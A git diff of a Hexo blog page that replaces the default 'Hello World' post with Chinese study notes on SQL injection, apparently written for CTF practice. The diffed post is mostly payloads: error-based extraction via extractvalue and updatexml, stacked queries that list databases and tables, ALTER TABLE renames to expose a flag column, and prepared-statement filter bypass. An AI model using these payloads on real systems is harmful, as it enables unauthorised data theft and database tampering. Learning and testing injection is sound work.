@@ -16,20 +16,20 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="sql注入： 数据库： information_schema表名字：information_schema.schemata 作用：数据库中的所有的 库名information_schema.tables 作用：数据库中的所有的 库名，表名information_schema.culmns 作用：数据库中的所有的 库名，表名，字段名 报错注入： 报错注入在没法用union联合查询时用，但前提还是不能">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2021/12/28/hello-world/index.html">
+<meta property="og:title" content="注入">
+<meta property="og:url" content="http://example.com/2022/01/18/sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="sql注入： 数据库： information_schema表名字：information_schema.schemata 作用：数据库中的所有的 库名information_schema.tables 作用：数据库中的所有的 库名，表名information_schema.culmns 作用：数据库中的所有的 库名，表名，字段名 报错注入： 报错注入在没法用union联合查询时用，但前提还是不能">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-12-28T14:39:49.334Z">
-<meta property="article:modified_time" content="2021-12-28T14:39:49.334Z">
+<meta property="article:published_time" content="2022-01-18T04:45:13.000Z">
+<meta property="article:modified_time" content="2022-01-18T04:47:23.163Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
-  <title>Hello World - Hexo</title>
+  <title>注入 - Hexo</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Hello World">
+            <span class="h2" id="subtitle" title="注入">
               
             </span>
 
@@ -185,8 +185,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-12-28 22:39" pubdate>
-        December 28, 2021 pm
+      <time datetime="2022-01-18 12:45" pubdate>
+        January 18, 2022 pm
       </time>
     </span>
   
@@ -196,7 +196,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      undefined 字
+      2.2k 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      NaN 分钟
+      19 分钟
     </span>
   
 
@@ -234,22 +234,47 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hello World</h1>
+            <h1 style="display: none">注入</h1>
             
             <div class="markdown-body">
-              <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+              <p>sql注入：</p>
+<p>数据库： information_schema<br>表名字：<br>information_schema.schemata 作用：数据库中的所有的 库名<br>information_schema.tables 作用：数据库中的所有的 库名，表名<br>information_schema.culmns 作用：数据库中的所有的 库名，表名，字段名</p>
+<p>报错注入：</p>
+<p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p>
+<h2 id="xpath语法错误："><a href="#xpath语法错误：" class="headerlink" title="xpath语法错误："></a>xpath语法错误：</h2><p>1.extractvalue函数：</p>
+<p>pyload：id=’and(select extractvalue(“anything”,concat(‘~’,(select语句))))</p>
+<p>例如：</p>
+<p>id=’and(select extractvalue(1,concat(‘~’,(select database()))))<br>id=’and(select extractvalue(1,concat(0x7e,@@version)))</p>
+<p>针对mysql数据库：</p>
+<p>查数据库名：id=’and(select extractvalue(1,concat(0x7e,(select database()))))<br>爆表名：id=’and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))<br>爆字段名：id=’and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”TABLE_NAME”))))<br>爆数据：id=’and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</p>
+<p>2.updatexml：</p>
+<p>payload：id=’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”))</p>
+<p>例如：</p>
+<p>‘and(select updatexml(1,concat(‘~’,(select database())),1))<br>‘and(select updatexml(1,concat(0x7e,@@database),1))<br>同样，针对mysql：</p>
+<p>爆数据库名：’and(select updatexml(1,concat(0x7e,(select database())),0x7e))<br>爆表名：’and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))<br>爆列名：’and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=”TABLE_NAME”)),0x7e))<br>爆数据：’and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</p>
+<h2 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h2><ol>
+<li><p>查数据库    1’;show databases;–+</p>
+</li>
+<li><p>查表            1’;show tables;–+</p>
+</li>
+<li><p>查询两个表的字段  1‘ ; show columns from ‘某某某’ ;–+</p>
+<h2 id="查询字段内容"><a href="#查询字段内容" class="headerlink" title="查询字段内容:"></a>查询字段内容:</h2><p>一、改表名</p>
+<p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>利用：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p>
+<ol>
+<li><p>; alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50); #</p>
+</li>
+<li><p>;  alter tables words rename to words1; </p>
+</li>
+<li><p>;  alter tables <code>1919810931114514</code> rename to words ;</p>
+</li>
+<li><p>;  alter tables words change flag id varchar(50); #</p>
+<p>二、预编译来绕过</p>
+<p>构造payload：</p>
+<p>‘;sEt @sql = CONCAT(‘se’,’lect * from <code>字段名</code>;’);prEpare stmt from @sql;EXECUTE stmt;#<br>1<br>‘;sEt @sql = CONCAT(‘se’,‘lect * from 字段名;’); 进行预编译<br>prEpare stmt from @sql; 设置变量<br>EXECUTE stmt;# 执行</p>
+</li>
+</ol>
+</li>
+</ol>
 
             </div>
             <hr>
@@ -270,15 +295,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/01/13/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
+                      <a href="/2022/01/18/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">我的第一篇博客</span>
+                        <span class="hidden-mobile">php魔术方法</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2022/01/13/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
+                        <span class="hidden-mobile">我的第一篇博客</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
